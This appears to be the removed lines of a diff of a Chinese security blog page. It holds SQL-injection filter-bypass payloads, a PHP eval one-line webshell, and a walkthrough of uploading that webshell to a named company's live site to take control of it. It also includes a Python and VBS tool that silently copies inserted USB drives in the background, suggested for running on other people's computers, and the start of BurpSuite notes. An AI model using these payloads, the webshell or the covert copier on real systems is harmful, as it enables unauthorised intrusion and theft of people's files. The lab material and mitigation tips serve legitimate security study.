-<p>虽然这句里面还有空格无法实现替换，但是在某些情况是一个非常实用的技巧。</p>
-<h2 id="0x07-注释符绕过"><a href="#0x07-注释符绕过" class="headerlink" title="0x07 注释符绕过"></a>0x07 注释符绕过</h2><p>sql注入中可以用到的注释符是#或者–，如果目标没有过滤，在需要注释掉后面的引号等情况下十分好用。<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and union select * from user --</span><br><span class="line">1&apos; and &apos;1&apos;=&apos;1&apos; order by 3 #</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x08-逗号绕过"><a href="#0x08-逗号绕过" class="headerlink" title="0x08 逗号绕过"></a>0x08 逗号绕过</h2><p>在某些WAF中对逗号进行了限制，或者一些通过逗号分隔post请求的环境，我们需要绕过逗号。<br>如我们要判断user第一个字符的ascii是否小于150，小于则返回1，否则返回0，我们知道从文本中提取字符应该用mid()函数，用法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT MID(column_name,start[,length]) FROM table_name;</span><br></pre></td></tr></table></figure></p>
-<p>如果要实现上面所说功能本该这么构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))&lt;150</span><br></pre></td></tr></table></figure></p>
-<p>但是如果没了逗号，我们就得用from x for y的形式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select mid(user() from 1 for 1)&lt;150</span><br></pre></td></tr></table></figure></p>
-<p>再如有的时候，我们需要用limit函数来限制返回的数据数量，如我们要查询，从第三行开始的一行数据，limit之后的第一个数字代表行数（从0开始算）后面数字代表从这行要返回的行数<br>数据表如下：</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg05.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user limit 2,1;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg06.png" alt=""></p>
-<p>如果逗号无法使用，我们可以用offset，offset和limit同时用用法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, columnN </span><br><span class="line">FROM table_name</span><br><span class="line">LIMIT [no of rows] OFFSET [row num]</span><br></pre></td></tr></table></figure></p>
-<p>所以这里我们可以：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user limit 1 offset 2</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg07.png" alt=""></p>
-<h2 id="0x09-比较符号绕过"><a href="#0x09-比较符号绕过" class="headerlink" title="0x09 比较符号绕过"></a>0x09 比较符号绕过</h2><p>在盲注的时候，很多时候要用到比较符号大于(&lt;)和小于(&gt;)来进行二分查找，如果目标对比较符号进行了过滤，我们就需要通过greatest和least等函数进行绕过，这两个函数用法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GREATEST(value1, value2, ...);</span><br><span class="line">LEAST(value1,value2,...);</span><br></pre></td></tr></table></figure></p>
-<p>greatest函数会返回这些值里的最大值，least函数会返回最小值。如果我们要用刚才的mid方法比较，就需要这样构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">greatest(ascii(mid(user(),0,1)),150)</span><br><span class="line">least(ascii(mid(user(),0,1)),150)</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>sql注入中常年作为owasp top 10中排名第一的漏洞，其危害不可小觑，有危害就有限制，有限制就有绕过，在这里比拼的是安全人员对漏洞原理的理解。如果作为防御方，更要有扎实的基本功，才能尽力避免这些问题。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/29/文件上传漏洞/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/03/29/文件上传漏洞/" itemprop="url">
-                  文件上传漏洞
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-29T20:07:14+08:00">
-                2018-03-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/03/29/文件上传漏洞/" class="leancloud_visitors" data-flag-title="文件上传漏洞">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-什么是文件上传漏洞"><a href="#0x00-什么是文件上传漏洞" class="headerlink" title="0x00 什么是文件上传漏洞"></a>0x00 什么是文件上传漏洞</h2><p>在网站一些可以上传文件的地方，利用上传漏洞上传木马可以直接得到WEBSHELL，危害等级极高。</p>
-<h2 id="0x01-产生原因"><a href="#0x01-产生原因" class="headerlink" title="0x01 产生原因"></a>0x01 产生原因</h2><ul>
-<li>未过滤或本地过滤<br>未过滤指没有限制任何格式的文件上传，这个时侯入侵者上传php文件，就可以直接利用。<br>本地过滤是在前端进行过滤，实际上相当于没有任何限制，入侵者可以通过抓包更改文件名直接绕过前端检查。</li>
-<li>黑名单扩展名过滤<br>黑名单因为限制的扩展名不够完善，导致可以通过各种其他的扩展名绕过，比如大小写混用，或者同故宫其他同种意思的扩展名进行绕过。</li>
-<li>文件头绕过<br>如上传图片文件时，在文件头加上图片文件的文件头如“GIF89a”，则可以绕过检查。</li>
-<li>content-type绕过<br>content-type在http request的请求头里面，所以可以直接通过请求者抓包重发更改来绕过。</li>
-</ul>
-<h2 id="0x02-搭建环境"><a href="#0x02-搭建环境" class="headerlink" title="0x02 搭建环境"></a>0x02 搭建环境</h2><p>我们先尝试搭建一下文件上传漏洞的环境进行测试。<br>首先配置好lamp环境，然后在/var/www/html/test文件夹下，创建新的form.html文件，写入如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;php_upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后创建upload_file.php，写入如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在。 &quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span><br><span class="line">    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">    echo &quot;文件存储在: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后我们在物理机中，写一个含有如下恶意代码的php文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&apos;a123456&apos;]) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后通过访问虚拟机中的网页，将文件上传</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu01.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu02.png" alt=""></p>
-<p>接着在浏览器访问/test/upload路径，可以看到我们的恶意代码已经上传</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu03.png" alt=""></p>
-<p>然后我们打开菜刀，将恶意代码的url和我们设置的密码写进去，进行连接，发现获取了目的服务器的权限，可以非常自由的访问所有路径，甚至进行写文件操作。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu04.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu05.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu06.png" alt=""></p>
-<h2 id="0x03-实战"><a href="#0x03-实战" class="headerlink" title="0x03 实战"></a>0x03 实战</h2><p>接下来我们用某公司网页进行一个实战，目前该漏洞已被修复，请不要再尝试  </p>
-<p>在目的公司页面 <a href="http://asm.51welink.com" target="_blank" rel="noopener">http://asm.51welink.com</a> 注册账号登陆<br>登陆进去后发现可以上传证书，但是限制了zip格式  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu07.png" alt=""></p>
-<p>同样我们写个和上面一样的php一句话木马，然后重命名成zip  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&apos;a123456&apos;]) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>通过burpsuite抓包上传的数据包，更改文件格式为php，上传  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu08.png" alt=""></p>
-<p>用菜刀连接，获取网站webshell。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_upload/fu09.png" alt=""></p>
-<h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><ul>
-<li>1.应用白名单的方式过滤文件扩展名</li>
-<li>2.使用三等于（===）来对比扩展名（防止类型转换带来的逻辑漏洞，之后写逻辑漏洞的时候会写到）</li>
-<li>3.如果不是图片等必要呈现出来的文件，对上传路径设置权限。</li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/24/基于python的u盘自动拷贝工具/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/03/24/基于python的u盘自动拷贝工具/" itemprop="url">
-                  基于python的u盘自动拷贝工具
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-24T21:54:18+08:00">
-                2018-03-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python/" itemprop="url" rel="index">
-                    <span itemprop="name">python</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/03/24/基于python的u盘自动拷贝工具/" class="leancloud_visitors" data-flag-title="基于python的u盘自动拷贝工具">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-需要用到的库"><a href="#0x00-需要用到的库" class="headerlink" title="0x00 需要用到的库"></a>0x00 需要用到的库</h2><ul>
-<li>OS：OS库提供了使用各种操作系统功能的接口。主要有对目录或者文件的新建，删除，查看文件属性，还提供了对文件以及目录的路径操作。</li>
-<li>shutil：对文件提供了移动，复制，打包，压缩等功能，这里主要用到复制功能。</li>
-<li>time： 时间处理的库，在这里用来程序休眠的时间。  </li>
-</ul>
-<h2 id="0x01-程序设计思路"><a href="#0x01-程序设计思路" class="headerlink" title="0x01 程序设计思路"></a>0x01 程序设计思路</h2><p>我们需要每隔一段时间检查是否有u盘插入，如果检测到有u盘，则将u盘的内容全部拷贝到本机的指定文件夹。  </p>
-<h2 id="0x02-最简单模式编程实现"><a href="#0x02-最简单模式编程实现" class="headerlink" title="0x02 最简单模式编程实现"></a>0x02 最简单模式编程实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line">USB = <span class="string">'D:\\'</span>  <span class="comment"># u盘目录</span></span><br><span class="line">SAVE = <span class="string">'C:\\Users\Leticia\Desktop\copy'</span>  <span class="comment"># 保存目录</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usbcopy</span><span class="params">()</span>:</span></span><br><span class="line">    shutil.copytree(USB, SAVE)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(USB):</span><br><span class="line">            usbcopy()</span><br><span class="line">        time.sleep(<span class="number">200</span>)  <span class="comment"># 休眠时间</span></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
-<p>此程序中，USB变量是u盘目录，根据个人电脑来填写，SAVE变量是将拷贝出来的文件保存的目录，time.sleep(200)代表每次判断完之后休眠200秒。<br>此时测试程序已经可以自动拷贝了，但是还存在一些问题，比如我们已经拷贝完成了，然后休眠完成之后u盘没有拔，这个时候会重新复制一遍。但是我们如果写成检测到u盘，拷贝一遍程序就停止运行，那么u盘内容发生变化我们要怎么做，所以我们还要加几个功能。  </p>
-<h2 id="0x03-增加检测变化模块的编程实现"><a href="#0x03-增加检测变化模块的编程实现" class="headerlink" title="0x03 增加检测变化模块的编程实现"></a>0x03 增加检测变化模块的编程实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join,getsize</span><br><span class="line">USB = <span class="string">'D:\\'</span>  <span class="comment"># u盘目录</span></span><br><span class="line">SAVE = <span class="string">'C:\\Users\Leticia\Desktop\copy'</span>  <span class="comment"># 保存目录</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdirsize</span><span class="params">(dir)</span>:</span></span><br><span class="line">    size=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> root,dirs,files <span class="keyword">in</span> os.walk(dir):</span><br><span class="line">        size+=sum([getsize(join(root,name)) <span class="keyword">for</span> name <span class="keyword">in</span> files])</span><br><span class="line">    print(size)</span><br><span class="line">    <span class="keyword">return</span> size</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usbcopy</span><span class="params">()</span>:</span></span><br><span class="line">    shutil.copytree(USB, SAVE)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    old_dirsize = <span class="number">0</span></span><br><span class="line">    new_dirsize = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(USB):</span><br><span class="line">            print(<span class="string">"检测到U盘"</span>)</span><br><span class="line">            new_dirsize = getdirsize(USB)</span><br><span class="line">            <span class="keyword">if</span> old_dirsize != new_dirsize:</span><br><span class="line">                usbcopy()</span><br><span class="line">                old_dirsize = new_dirsize</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"没有变化"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"暂时没有U盘"</span>)</span><br><span class="line">        print(<span class="string">"开始休眠"</span>)</span><br><span class="line">        time.sleep(<span class="number">5</span>)  <span class="comment"># 休眠时间</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">"休眠结束"</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
-<p>这里我们新加了一个getdirsize函数来遍历u盘文件并统计总大小，然后如果总大小改变，则拷贝，如果没变，就不重新拷贝。<br>这样就解决了文件更新的问题，根据下图print的提示我们可以看到大概的工作流程。  </p>
-<h2 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h2><p>此时我们的代码可以运行了，但是如果我们拿到其他人电脑里，因为python环境等问题很大可能无法执行，所以我们可以借助前面一篇博客说过的  <a href="http://uuzdaisuki.com/2017/05/11/%E4%BD%BF%E7%94%A8python-pyinstaller%E6%89%93%E5%8C%85python%E7%A8%8B%E5%BA%8F%E4%B8%BAexe/" target="_blank" rel="noopener">http://uuzdaisuki.com/2017/05/11/%E4%BD%BF%E7%94%A8python-pyinstaller%E6%89%93%E5%8C%85python%E7%A8%8B%E5%BA%8F%E4%B8%BAexe/</a> 将python程序打包成exe在其他电脑中使用。  </p>
-<p>如果这样还觉得不方便的话，在这里再提供一个vbs的拷贝小脚本，同样能达到我们的功能，在txt中输入如下代码，然后根据个人路径稍作更改，然后讲后缀改成vbs，双击运行，就可以在后台自动拷贝了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set fso=createobject(&quot;scripting.filesystemobject&quot;)</span><br><span class="line">set ws=createobject(&quot;wscript.shell&quot;)</span><br><span class="line">on error resume next</span><br><span class="line">do</span><br><span class="line">wscript.sleep 1000</span><br><span class="line">if fso.driveexists(&quot;D:&quot;) then</span><br><span class="line">fso.copyfile &quot;D:*&quot;,&quot;C:\Users\Leticia\Desktop\copy&quot;</span><br><span class="line">fso.copyfolder &quot;D:*&quot;,&quot;C:\Users\Leticia\Desktop\copy&quot;</span><br><span class="line">wscript.sleep 20000</span><br><span class="line">end if</span><br><span class="line">loop</span><br></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/24/BurpSuite使用笔记/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/03/24/BurpSuite使用笔记/" itemprop="url">
-                  BurpSuite使用笔记
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-24T15:55:28+08:00">
-                2018-03-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/03/24/BurpSuite使用笔记/" class="leancloud_visitors" data-flag-title="BurpSuite使用笔记">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-What-is-BurpSuite"><a href="#0x00-What-is-BurpSuite" class="headerlink" title="0x00 What is BurpSuite"></a>0x00 What is BurpSuite</h2><p>Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。  </p>
-<h2 id="0x01-主要功能"><a href="#0x01-主要功能" class="headerlink" title="0x01 主要功能"></a>0x01 主要功能</h2><ul>
-<li>1.Target(目标)——显示目标目录结构的的一个功能</li>
-<li>2.Proxy（代理）——是一个拦截HTTP/S的代理服务器（抓包），作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</li>
-<li>3.Spider（爬虫）——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</li>
-<li>4.Scanner（扫描器）[仅限专业版]——是一个高级的工具，执行后，它能自动地发现web 应用程序的安全漏洞。</li>
-<li>5.Intruder（入侵）——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</li>
-<li>6.Repeater（中继器）——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。</li>
-<li>7.Sequencer（会话）——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</li>
